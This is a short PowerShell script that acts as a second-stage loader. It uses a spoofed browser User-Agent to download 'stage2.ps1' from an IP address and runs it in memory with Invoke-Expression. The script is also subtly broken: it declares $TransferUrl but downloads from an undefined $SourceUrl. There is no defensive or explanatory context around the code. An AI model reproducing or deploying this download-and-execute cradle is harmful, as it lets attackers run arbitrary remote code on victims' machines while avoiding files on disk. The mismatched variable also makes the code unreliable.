[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://192.0.2.76/stage2.ps1',
    [int]$RequestTimeout = 47
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $DownloadedScript = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($DownloadedScript)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $DownloadedScript.Length)
    Invoke-Expression $DownloadedScript
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 28
Write-Verbose "stage marker 7 reached"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
